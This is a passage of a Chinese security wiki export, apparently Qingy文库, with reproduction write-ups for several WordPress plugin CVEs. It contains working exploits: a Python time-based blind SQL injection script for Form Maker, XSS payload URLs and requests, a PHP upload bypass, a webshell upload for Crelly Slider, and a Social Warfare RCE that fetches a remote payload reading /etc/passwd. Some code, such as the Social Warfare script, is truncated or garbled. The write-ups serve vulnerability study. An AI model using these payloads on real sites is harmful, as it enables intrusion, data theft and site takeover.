第二步，进入\"后台管理\"，定位利用点，点击下图红框中图片进行上传： 上传并抓取数据包： 第三步，修改post包中\"filetype\"参数类型为\"php\"；经分析 \"data\"参数为base64加密，这里我们将测试数据\"\"经过base64加密等构造，形成\"data\"参数的数据：data%3Aimage%2Fjpeg%3Bbase64%2CPD9waHAgcGhwaW5mbygpOz8%2B，最后数据包放行，返回成功上传为php文件的路径： 最后，尝试访问，成功： 参考链接 https://xz.aliyun.com/t/7284 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:36 "},"Web安全/Wordpress/Wordpress 插件漏洞/（CVE- 2019-10866）WordPress Plugin - Form Maker 1.13.3 sql注入/（CVE- 2019-10866）WordPress Plugin - Form Maker 1.13.3 sql注入.html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/（CVE- 2019-10866）WordPress Plugin - Form Maker 1.13.3 sql注入/（CVE- 2019-10866）WordPress Plugin - Form Maker 1.13.3 sql注入.html","title":"（CVE- 2019-10866）WordPress Plugin - Form Maker 1.13.3 sql注入","keywords":"","body":"（CVE- 2019-10866）WordPress Plugin - Form Maker 1.13.3 sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 环境搭建 运行环境很简单，只是在vulapps的基础环境的上加了xdebug调试插件，把docker容器作为远程服务器来进行调试。 Dockerfile文件: FROM medicean/vulapps:base_lamp_php7 RUN pecl install xdebug COPY php.ini /etc/php/7.0/apache2/ COPY php.ini /etc/php/7.0/cli/ docker-compose文件: version: '3' services: lamp-php7: build: . ports: - \"80:80\" volumes: - \"/Users/mengchen/Security/Code Audit/html:/var/www/html\" - \"/Users/mengchen/Security/Code Audit/tmp:/tmp\" php.ini中xdebug的配置 [xdebug] zend_extension=\"/usr/lib/php/20151012/xdebug.so\" xdebug.remote_enable=1 xdebug.remote_host=10.254.254.254 xdebug.remote_port=9000 xdebug.remote_connect_back=0 xdebug.profiler_enable=0 xdebug.idekey=PHPSTORM xdebug.remote_log=\"/tmp/xdebug.log\" 因为我是在Mac上，所以要给本机加一个IP地址，让xdebug能够连接 sudo ifconfig lo0 alias 10.254.254.254 PHPStorm也要配置好相对路径: WordPressPlugin-FormMaker1.13.3sql注入/media/rId25.png) 插件下载地址: https://downloads.wordpress.org/plugin/form-maker.1.13.3.zip WordPress使用最新版就可以，在这里我使用的版本是5.2.2，语言选的简体中文。 PS: WordPress搭建完毕后，记得关闭自动更新。 POC http://0-sec.org/wp-admin/admin.php?page=submissions_fm&task=display¤t_id=2&order_by=group_id&asc_or_desc=,(case+when+(select+ascii(substring(user(),1,1)))%3d114+then+(select+sleep(5)+from+wp_users+limit+1)+else+2+end)+asc%3b Python脚本，修改自exploit-db #coding:utf-8 import requests import time vul_url = \"http://127.0.0.1/wp-admin/admin.php?page=submissions_fm&task=display¤t_id=2&order_by=group_id&asc_or_desc=\" S = requests.Session() S.headers.update({\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en;q=0.8,zh;q=0.5,en-US;q=0.3\", \"Referer\": \"http://127.0.0.1/wp-login.php?loggedout=true\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\"}) length = 0 TIME = 3 username = \"admin\" password = \"admin\" def login(username, password): data = { \"log\": \"admin\", \"pwd\": \"admin\", \"wp-submit\": \"\\xe7\\x99\\xbb\\xe5\\xbd\\x95\", \"redirect_to\": \"http://127.0.0.1/wp-admin/\", \"testcookie\": \"1\" } r = S.post('http://127.0.0.1/wp-login.php', data=data, cookies = {\"wordpress_test_cookie\": \"WP+Cookie+check\"}) def attack(): flag = True data = \"\" length = 1 while flag: flag = False tmp_ascii = 0 for ascii in range(32, 127): tmp_ascii = ascii start_time = time.time() payload = \"{vul_url},(case+when+(select+ascii(substring(user(),{length},1)))%3d{ascii}+then+(select+sleep({TIME})+from+wp_users+limit+1)+else+2+end)+asc%3b\".format(vul_url=vul_url, ascii=ascii, TIME=TIME, length=length) #print(payload) r = S.get(payload) tmp = time.time() - start_time if tmp >= TIME: flag = True break if flag: data += chr(tmp_ascii) length += 1 print(data) login(username, password) attack() image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:16 "},"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2018-19287）WordPress Plugin - Ninja Forms 3.3.17 XSS/（CVE-2018-19287）WordPress Plugin - Ninja Forms 3.3.17 XSS.html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2018-19287）WordPress Plugin - Ninja Forms 3.3.17 XSS/（CVE-2018-19287）WordPress Plugin - Ninja Forms 3.3.17 XSS.html","title":"（CVE-2018-19287）WordPress Plugin - Ninja Forms 3.3.17 XSS","keywords":"","body":"（CVE-2018-19287）WordPress Plugin - Ninja Forms 3.3.17 XSS 一、漏洞简介 Ninja Forms是WordPress的终极免费表单创建工具。使用简单但功能强大的拖放式表单创建器在几分钟内构建表单。对于初学者，可以快速轻松地设计复杂的表单，绝对没有代码。对于开发人员，利用内置的钩子，过滤器，甚至自定义字段模板，使用Ninja Forms作为框架，在表单构建或提交的任何步骤中执行您需要的任何操作。 二、漏洞影响 三、复现过程 下面是我从exploit-db上复制的POC，为了方便判断，修改了弹窗的内容。 http://0-sec.org/wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date&end_date=\">alert(/POC3/);&nf_form_filter&paged=1 我们只要直接复制POC到浏览器的地址栏回车即可触发漏洞。 下图是触发第一个POC的图： WordPressPlugin-NinjaForms3.3.17XSS/media/rId24.png) 下图是触发第二个POC的图： WordPressPlugin-NinjaForms3.3.17XSS/media/rId25.png) 下图是触发第三个POC的图： WordPressPlugin-NinjaForms3.3.17XSS/media/rId26.png) 漏洞分析过程 笔者直接从POC方面入手，简单分析一下漏洞的成因。由于方法是一样的，笔者是一个懒人，这里就只分析了POC3的成因。 通过POC查找关键词nf_sub，确定了核心文件\\wp-content\\plugins\\ninja-forms\\includes\\Admin\\Menus\\Submissions.php。 下图是Submissions.php部分内容： WordPressPlugin-NinjaForms3.3.17XSS/media/rId28.png) 通过粗略的阅读，发现这个函数是导致POC3成功弹窗的关键。 下图是Submissions.php文件第71-104行内容： public function change_views( $views ) { // Remove our unused views. unset( $views[ 'mine' ] ); unset( $views[ 'publish' ] ); // If the Form ID is not empty... if( ! empty( $_GET[ 'form_id' ] ) ) { // ...populate the rest of the query string. $form_id = '&form_id=' . $_GET[ 'form_id' ] . '&nf_form_filter&paged=1'; } else { // ...otherwise send in an empty string. $form_id = ''; } // Build our new views. $views[ 'all' ] = '' . __( 'Completed', 'ninja-forms' ) . ''; $views[ 'trash' ] = '' . __( 'Trashed', 'ninja-forms' ) . ''; // Checks to make sure we have a post status. if( ! empty( $_GET[ 'post_status' ] ) ) { // Depending on the domain set the value to plain text. if ( 'all' == $_GET[ 'post_status' ] ) { $views[ 'all' ] = __( 'Completed', 'ninja-forms' ); } else if ( 'trash' == $_GET[ 'post_status' ] ) { $views[ 'trash' ] = __( 'Trashed', 'ninja-forms' ); } } return $views; } 从上面代码，我们可以看到，form_id并没有被过滤，导致XSS存在。 $form_id = '&form_id=' . $_GET[ 'form_id' ] . '&nf_form_filter&paged=1'; 四、参考链接 https://www.exploit-db.com/exploits/45880/ https://www.freebuf.com/vuls/190411.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:13 "},"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2019-15866）WordPress Plugin - Crelly Slider 任意文件上传&RCE漏洞/（CVE-2019-15866）WordPress Plugin - Crelly Slider 任意文件上传&RCE漏洞.html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2019-15866）WordPress Plugin - Crelly Slider 任意文件上传&RCE漏洞/（CVE-2019-15866）WordPress Plugin - Crelly Slider 任意文件上传&RCE漏洞.html","title":"（CVE-2019-15866）WordPress Plugin - Crelly Slider 任意文件上传&RCE漏洞","keywords":"","body":"（CVE-2019-15866）WordPress Plugin - Crelly Slider 任意文件上传&RCE漏洞 一、漏洞简介 WordPress Crelly Slider是一个开源的幻灯片插件。用户可以使用强大的拖放生成器来添加文本、图像、youtube/vimeo视频，并为每个视频制作动画。 WordPress Crelly Slider插件具有20,000多个活动安装。该插件在1.3.4及更低版本中出现任意文件上传漏洞。任意经过身份验证的用户（例如订阅者身份）可通过向wp_ajax_crellyslider_importSlider发送带有恶意PHP文件的ZIP压缩文件来利用该漏洞上传文件并将恶意PHP文件解压到插件目录中。 二、漏洞影响 三、复现过程 漏洞分析 在crelly-slider\\crellyslider.php文件中，存在如下代码 WordPressPlugin-CrellySlider任意文件上传&RCE漏洞/media/rId25.png) 位于上图45行处可见，插件使用if(is_admin())进行判断，满足条件则可以进入上图if分支，并且在58行处将wordpress/ajax.php文件包含进来 接着来分析下ajax.php文件 在crelly-slider/wordpress/ajax.php中存在如下代码 WordPressPlugin-CrellySlider任意文件上传&RCE漏洞/media/rId26.png) 可见上图520行处注册了一个名为wp_ajax_crellyslider_importSlider 的ajax action并指向ajax.php中的crellyslider_importSlider_callback方法。 在wordpress插件调用机制里，crellyslider_importSlider_callback方法可以通过构造 http://0-sec.org/wordpress/wp-admin/admin-ajax.php?action=crellyslider_importSlider 这样的url来访问 具体调用链如下 WordPressPlugin-CrellySlider任意文件上传&RCE漏洞/media/rId27.png) 在搞清楚crellyslider_importSlider_callback方法是如何通过url调用后，继续分析crellyslider_importSlider_callback方法 在crellyslider_importSlider_callback方法中523行处使用crellyslider_importSlider方法来处理上传文件，如下图 WordPressPlugin-CrellySlider任意文件上传&RCE漏洞/media/rId28.png) 接着来看下crellyslider_importSlider方法 WordPressPlugin-CrellySlider任意文件上传&RCE漏洞/media/rId29.png) crellyslider_importSlider方法将上传zip文件解压，并将解压后的文件存储于/wordpress/temp/路径中，如上图553行红框处 现在梳理一下上文介绍的流程： crelly-slider插件将使用is_admin()方法验证用户是否有使用crellyslider_importSlider_callback方法的使用权限。通过is_admin()方法验证的用户则可以使用crellyslider_importSlider_callback方法上传任意zip压缩包，程序将上传的压缩包中的文件解压至/wordpress/temp/路径。 能使整个流程执行的前提是通过is_admin()的校验。但是is_admin()方法具体是做什么的呢？它是否像字面上看起来的那样：判断用户是否是管理员身份吗？------答案是否定的。 is_admin方法只是用来确定当前请求是否是针对管理界面页面。使用if(is_admin())只是为了确保if条件中的代码在后端管理界面加载，而不会再前台管理界面加载 is_admin方法并没有核实用户是否是管理员身份的能力，其代码如下图: WordPressPlugin-CrellySlider任意文件上传&RCE漏洞/media/rId30.png) 因此crelly-slider插件开发者误用了is_admin方法，错误的将其用来判断当前操作的用户身份是否为管理员身份。 事实上，只要是是后台文件，都会定义WP_ADMIN常量为true，例如本次漏洞的入口：wp-admin/admin-ajax.php文件，如下图 WordPressPlugin-CrellySlider任意文件上传&RCE漏洞/media/rId31.png) 可见上图17-19行，使用常量WP_ADMIN来标识这是一个后台文件 这就导致了无论什么身份的用户，只要访问后台文件，is_admin方法都会返回true 我们新建一个名为subscriber的用户，其权限为订阅者权限(subscriber) WordPressPlugin-CrellySlider任意文件上传&RCE漏洞/media/rId32.png) 在wordpress中，订阅者权限具有极低的权限： \"具有订阅者用户角色的用户可以登录WordPress站点并更新自己的配置。他们可以根据需要更改密码。订阅者用户角色无法在WordPress管理后台内撰写文章，查看评论或执行任何其他操作。订阅者用户角色无权访问设置，插件或主题，因此无法更改网站上的任何设置\" 订阅者wordpress管理页面如下 WordPressPlugin-CrellySlider任意文件上传&RCE漏洞/media/rId33.png) crelly-slider插件开发者的本意是希望\"is_admin\"用户拥有调用crellyslider_importSlider ajax接口的权限，但实际上，subscriber身份的用户仍有权限使用crellyslider_importSlider ajax接口上传压缩包并将其中内容解压到/wordpress/temp/路径中 在我们构造的webshell.php文件中写入如下代码 WordPressPlugin-CrellySlider任意文件上传&RCE漏洞/media/rId34.png) 并将其压缩至webshell.zip中 WordPressPlugin-CrellySlider任意文件上传&RCE漏洞/media/rId35.png) 使用subscriber身份的用户的cookie，发送如下POST请求 WordPressPlugin-CrellySlider任意文件上传&RCE漏洞/media/rId36.png) webshell.zip 中的webshell.php将会被解压到wordpress\\temp目录下，如下图 WordPressPlugin-CrellySlider任意文件上传&RCE漏洞/media/rId37.png) 通过访问这个地址，webshell.php中的内容将会被执行 四、参考链接 https://xz.aliyun.com/t/6841 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:17 "},"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss/（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss.html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss/（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss.html","title":"（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss","keywords":"","body":"（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss 一、漏洞简介 适用于WordPress的3.2.7之前的\"all-in-one-seo-pack plugin\"插件（aka All in One SEO Pack）易受存储XSS的影响，原因是该插件通过不安全的占位符替换提供的帖子的SEO特定描述的编码不正确。 二、漏洞影响 wordpress \\ 三、复现过程 1、利用过程 创建或编辑帖子时，可以设置以下值来显示漏洞： Title: test_aiosp_title&<>\"';>a Description: test_aiosp_desc&<>\"'; pt:%post_title% wp_title:%wp_title% bd:%blog_description% sd:%site_description% bt: %blog_title% st: %site_title% desc:%description% 当帖子被保存并以后访问时，将显示JavaScript警报弹出窗口。生成的HTML页面将包含以下代码 test_aiosp_title&<>\"'; | XXXXXXX \"'; wp_title:test_aiosp bd: sd: bt: XXXXXXX st: XXXXXXX desc:%description%\" /> 2、详细分析 该插件将几个字段添加到可以创建或编辑帖子的页面上。这样可以为每个帖子设置自定义标题和描述。此处提供的信息将插入meta到帖子页面上的相应-tags中。在将字段的值插入页面的HTML中之前，先对这些字段的值进行转义。 但是，在描述字段中，可以插入占位符，这些占位符在输出前已被某些值替换。也可以为前面提到的标题字段设置一个占位符。相关代码可以在 aioseop_class.php第4546-4548行中找到： if ( false !== strpos( $description, '%post_title%', 0 ) ) { $description = str_replace( '%post_title%', $this->get_aioseop_title( $post, false ), $description ); } 当攻击者在标题字段中设置有效负载并在描述字段中为标题字段的值提供占位符时，标题字段的原始值将被插入描述中。此后该描述未经过清理或编码。这使攻击者可以突破meta-tag属性并插入任意HTML和J Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:21 "},"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2019-16523）WordPress Plugin - Events Manager  储存型xss/（CVE-2019-16523）WordPress Plugin - Events Manager  储存型xss.html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2019-16523）WordPress Plugin - Events Manager  储存型xss/（CVE-2019-16523）WordPress Plugin - Events Manager  储存型xss.html","title":"（CVE-2019-16523）WordPress Plugin - Events Manager  储存型xss","keywords":"","body":"（CVE-2019-16523）WordPress Plugin - Events Manager 储存型xss 一、漏洞简介 WordPress的5.9.5版以上的事件管理器插件（又名\"事件管理器\"）容易受到存储的XSS的影响，这是由于编码不正确和插入提供给该插件提供的短码属性map_style（locations_map和events_map）的数据所致。 二、漏洞影响 wordpress \\ 三、复现过程 1、利用过程 要利用此漏洞，攻击者需要创建或编辑帖子并插入上面提到的短代码之一。在此示例中，我们使用locations_map简码并将属性设置 map_style为的base64编码值 {\"a\":\"test\\\"alert(1)\"}。 这将导致以下简码： [locations_map test=\"\" map_style=\"eyJhIjoidGVzdFwiPC9zY3JpcHQ+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiJ9Cg==\"] 然后可以将该短代码插入到帖子中，然后由恶意用户发布。任何访问该职位的人都会受到有效载荷的影响，因此是XSS攻击的受害者。 2、详细分析 Events Manager插件提供了用于创建地图小部件的短代码，例如用于显示事件的位置。通过map_style使用简码中的属性提供自定义样式，可以直观地调整这些地图。为了防止XSS ，在shortcode属性内使用HTML 受到限制。但是，在这种情况下，可以注入任意HTML和JavaScript，因为该 map_style属性需要一个以base64编码的JSON对象。这允许绕过消毒。简码locations_map和events_map受此问题影响： 在em-shortcode.php（第43-56行），我们可以看到该属性是经过base64解码的，然后使用json_decode进行了解析。如果JSON语法有效，则将删除空格并将对象作为map_json_style变量传递到模板。请参见下面的代码段： //add JSON style to map $style = ''; if( !empty($args['map_style']) ){ $style= base64_decode($args['map_style']); $style_json= json_decode($style); if( is_array($style_json) || is_object($style_json) ){ $style = preg_replace('/[\\r\\n\\t\\s]/', '', $style); }else{ $style = ''; } unset($args['map_style']); } ob_start(); em_locate_template('templates/map-global.php',true, array('args'=>$args, 'map_json_style' => $style)); 在templates/templates/map-global.php（第16-21行）中，变量无需进一步编码即可插入脚本标签内： if( typeof EM == 'object'){ if( typeof EM.google_map_id_styles != 'object' ) EM.google_map_id_styles = []; EM.google_map_id_styles[''] = ; } 这样就完美的构成了x Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:22 "},"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss/（CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss.html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss/（CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss.html","title":"（CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss","keywords":"","body":"（CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss 一、漏洞简介 二、漏洞影响 CSS Hero插件 (\\ 三、复现过程 首先WordPress应用中确保CSS Hero Plugin安装。 poc hxxp:// 0-sec.org/?csshero_action=edit_page&rand=1015&foo%22%3E%3C/iframe%3E%3Cscript%3Ealert(%27Reflected%20XSS%20in%20CSS%20Hero%204.0.3%27)%3C/script%3E%3Ciframe%3Ebar Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:22 "},"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2019-9978）WordPress Plugin - social warfare 远程命令执行漏洞/（CVE-2019-9978）WordPress Plugin - social warfare 远程命令执行漏洞 .html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2019-9978）WordPress Plugin - social warfare 远程命令执行漏洞/（CVE-2019-9978）WordPress Plugin - social warfare 远程命令执行漏洞 .html","title":"（CVE-2019-9978）WordPress Plugin - social warfare 远程命令执行漏洞 ","keywords":"","body":"（CVE-2019-9978）WordPress Plugin - social warfare 远程命令执行漏洞 一、漏洞简介 WordPress social-warfare插件3.5.3之前版本中存在跨站脚本漏洞。远程攻击者可借助'swp_url'参数利用该漏洞注入恶意的JavaScript脚本。 二、漏洞影响 Social WarFare Plugin (\\ 三、复现过程 poc 首先在自己的服务器上传http(s)://www.0-sec.org/payload.txt system('cat /etc/passwd') useage python cve-2019-9978.py --target http://vulntarget.com --payload-uri http://yourpayloadsite.com/payload.txt # Title: RCE in Social Warfare Plugin ( ] Sending Payload to System!\" exploit = EXPLOIT( options.target, options.payload ) exploit.engage() if __name__ == \"__main__\": main() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:15 "},"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2020-10385）WordPress Plugin - WPForms 1.5.9 储存型xss/（CVE-2020-10385）WordPress Plugin - WPForms 1.5.9 储存型xss.html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2020-10385）WordPress Plugin - WPForms 1.5.9 储存型xss/（CVE-2020-10385）WordPress Plugin - WPForms 1.5.9 储存型xss.html","title":"（CVE-2020-10385）WordPress Plugin - WPForms 1.5.9 储存型xss","keywords":"","body":"（CVE-2020-10385）WordPress Plugin - WPForms 1.5.9 储存型xss 一、漏洞简介 WordPress WPForms Contact Form 1.5.9之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。 二、漏洞影响 Version: 1.5.8.2 and below 三、复现过程 poc POST /wp-admin/admin-ajax.php HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://www.0-sec.org/wp-admin/admin.php?page=wpforms-builder&view=settings&form_id=23 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 3140 Origin: http://www.0-sec.org Connection: close Cookie: wp-saving-post=15-saved; wordpress_db156a460ca831632324809820a538ce=jinson%7C1582145873%7CBKGMGaw77TcSEz7kE0ijBd8VfAq7KwALhBVfKNRbKst%7Cf826697f923b7f17c30049eea275c6523b7e2418ab354e106c50f0314b9bdae9; comment_author_email_db156a460ca831632324809820a538ce=dev-email@flywheel.local; comment_author_db156a460ca831632324809820a538ce=jinson; wp-settings-time-1=1581973079; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_db156a460ca831632324809820a538ce=jinson%7C1582145873%7CBKGMGaw77TcSEz7kE0ijBd8VfAq7KwALhBVfKNRbKst%7Cbaecd49d797bff21499da712891744737c67fd481d59e04a952554579f26c637 action=wpforms_save_form&data=%5B%7B%22name%22%3A%22id%22%2C%22value%22%3A%2223%22%7D%2C%7B%22name%22%3A%22field_id%22%2C%22value%22%3A%2213%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bid%5D%22%2C%22value%22%3A%2211%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Btype%5D%22%2C%22value%22%3A%22text%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Blabel%5D%22%2C%22value%22%3A%22Single+Line+Text%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bdescription%5D%22%2C%22value%22%3A%22%3Cscript%3Ealert(%5C%22XSS+on+form+description%5C%22)%3C%2Fscript%3E%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bsize%5D%22%2C%22value%22%3A%22medium%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bplaceholder%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Blimit_count%5D%22%2C%22value%22%3A%221%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Blimit_mode%5D%22%2C%22value%22%3A%22characters%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bdefault_value%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bcss%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Binput_mask%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22settings%5Bform_title%5D%22%2C%22value%22%3A%22Security+Test+WPForms%22%7D%2C%7B%22name%22%3A%22settings%5Bform_desc%5D%22%2C%22value%22%3A%22%3Cscript%3Ealert(%5C%22XSS+on+form+description+2%5C%22)%3C%2Fscript%3E%22%7D%2C%7B%22name%22%3A%22settings%5Bform_class%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22settings%5Bsubmit_text%5D%22%2C%22value%22%3A%22Submit%22%7D%2C%7B%22name%22%3A%22settings%5Bsubmit_text_processing%5D%22%2C%22value%22%3A%22Sending...%22%7D%2C%7B%22name%22%3A%22settings%5Bsubmit_class%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22settings%5Bhoneypot%5D%22%2C%22value%22%3A%221%22%7D%2C%7B%22name%22%3A%22settings%5Bnotification_enable%5D%22%2C%22value%22%3A%221%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bemail%5D%22%2C%22value%22%3A%22%7Badmin_email%7D%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bsubject%5D%22%2C%22value%22%3A%22New+Security+Test+WPForms+Entry%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bsender_name%5D%22%2C%22value%22%3A%22ptest%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bsender_address%5D%22%2C%22value%22%3A%22%7Badmin_email%7D%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Breplyto%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bmessage%5D%22%2C%22value%22%3A%22%7Ball_fields%7D%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Btype%5D%22%2C%22value%22%3A%22message%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Bmessage%5D%22%2C%22value%22%3A%22%3Cp%3EThanks+for+contacting+us!+We+will+be+in+touch+with+you+shortly.%3C%2Fp%3E%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Bmessage_scroll%5D%22%2C%22value%22%3A%221%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Bpage%5D%22%2C%22value%22%3A%222%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Bredirect%5D%22%2C%22value%22%3A%22%22%7D%5D&id=23&nonce=938cf431d2 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:23 "},"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2020-12462）WordPress Plugin - Ninja Forms CSRF to XSS/（CVE-2020-12462）WordPress Plugin - Ninja Forms CSRF to XSS.html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/（CVE-2020-12462）WordPress Plugin - Ninja Forms CSRF to XSS/（CVE-2020-12462）WordPress Plugin - Ninja Forms CSRF to XSS.html","title":"（CVE-2020-12462）WordPress Plugin - Ninja Forms CSRF to XSS","keywords":"","body":"（CVE-2020-12462）WordPress Plugin - Ninja Forms CSRF to XSS 一、漏洞简介 Ninja Forms 3.4.24.2之前的所有版本中存在一个严重的CSRF to XSS漏洞。成功利用此漏洞可以使得攻击者将WordPress网站中启用的Ninja Forms表单替换为包含恶意JavaScript的表单。当用户使用这些表单时触发xss漏洞。 二、漏洞影响 Ninja Forms \\ 三、复现过程 根据漏洞披露来看，本次漏洞存在于ninja-forms\\lib\\NF_Upgrade.php文件 ninja_forms_ajax_import_form函数 在分析漏洞之前，我们先来了解下这个存在漏洞的文件是做什么用的。存在漏洞的文件名为NF_Upgrade.php，从字面意义上来看，是升级的意思，但这个文件的功能并不是如同其命名（Upgrade）那样用来升级ninja-forms插件版本，而是涉及到ninja-forms的一个特殊功能------\"降级\"Ninja Forms插件中存在着一个名为 \"降级\"的功能。使用该功能用户可以将其表单样式和功能恢复为该插件2.9.x版本 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId24.png) 使用降级后，将删除目前安装的3.0版本的所有表单数据。因此该功能提示用户在使用该功能前导出表单数据。 从后台代码来看，点击降级按钮后，程序启用位于deprecated路径的旧版ninja-forms入口文件 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId25.png) 下图是位于deprecated路径的2.x版本ninja-forms入口文件 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId26.png) 作为降级功能的一部分，ninja-forms编写了NF_Upgrade.php文件，文件中AJAX函数旨在在使用\"降级\"模式时可以导入正常模式中导出的表单 在了解了NF_Upgrade.php文件存在的意义之后，接下来分析下NF_Upgrade.php文件中存在漏洞的ninja_forms_ajax_import_form函数 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId27.png) NF_Upgrade.php文件在25行处通过add_action注册了一个连接到ninja_forms_ajax_import_form函数的hook WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId28.png) 因此可以通过访问如下链接来触发ninja_forms_ajax_import_form函数 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId29.png)在了解了ninja_forms_ajax_import_form函数如何通过请求调用后，继续分析该函数 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId30.png) ninja_forms_ajax_import_form函数在27行处检验了用户权限 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId31.png) 在29行处获取POST请求中import参数，在31行处获取POST请求中formID参数 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId32.png) 程序在35行处将POST中提交的import参数与formID参数传入import_form函数中进行导入处理 ninja_forms_ajax_import_form函数的作用，从对上文代码的理解，应该是用来给管理员提供导入表单功能用的。 但是ninja_forms_ajax_import_form函数在安全上仅仅校验了使用者的权限，这点确实可以防止未授权访问的发生，但并未校验提交表单中的csrf token进行校验，并不能防范csrf漏洞，因此攻击者可以构造一个恶意页面链接诱骗管理员点击，从而向Ninja Forms插件提交一个导入恶意表单的请求。 ninja_forms_ajax_import_form函数接收POST传入的两个参数：import参数与formID参数，import参数中的内容是导入表单的数据，formID参数值是对应的表单id。经过实际测试发现，如果formID参数设置为一个已经存在的表单，则导入的表单内容将会覆盖原有表单。 在测试环境中有如下表单normal_form。攻击者可以通过查看使用该表单的页面源码来获得formID，这里normal_form的formID为2 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId33.png) normal_form是一个简单的单行文本表单 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId34.png) 如果攻击者向在这个表单中插入一些恶意的js脚本，则可以在攻击时指定POST中formID为2 